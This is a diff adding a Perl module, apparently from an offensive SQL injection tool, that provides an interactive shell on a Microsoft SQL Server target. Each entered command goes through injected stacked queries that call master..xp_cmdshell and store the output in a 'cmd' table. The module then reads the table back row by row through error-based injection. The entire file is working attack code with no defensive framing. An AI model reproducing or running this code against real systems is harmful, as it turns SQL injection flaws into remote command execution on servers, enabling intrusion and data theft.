@@ -1,0 +1,46 @@
+# Interactive command shell
+# uses XP_cmdshell
+return 1;
+
+sub ishell{
+
+while(1){
+
+print "\nXP_CMDSHELL\>";
+$cmd=<STDIN>; chomp $cmd; if ($cmd eq "exit"){last;}
+runcmd($cmd);
+
+	}
+
+}
+
+sub runcmd{
+
+@cmd_vars = @_;
+$cmd =$cmd_vars[0]; chomp $cmd;
+
+
+$t_query=	$qt .
+		' drop table cmd;create table cmd(data varchar(4096), num int identity(1,1));'.
+		" INSERT into cmd EXEC master..xp_cmdshell '" .$cmd ."'; Insert into cmd values('theend')--";
+		sendsqlattack($t_host,$t_query,$req,$t_port); # send attack and set $err
+	
+
+### Extract results
+	$index=1; # Start at first row and work down
+	while(1){
+
+	$print_buffer="";
+	$t_query=	
+	$qt ." or 1 in \(select TOP 1 data from cmd where num =$index\)--";
+	sendsqlattack($t_host,$t_query,$req,$t_port);
+	chomp $err;
+	if($err =~"theend"){ last;}	# If reached the end exit sub
+	$print_buffer =$err ."\n";
+	print $print_buffer;
+	$index++;
+
+	}
+
+
+}
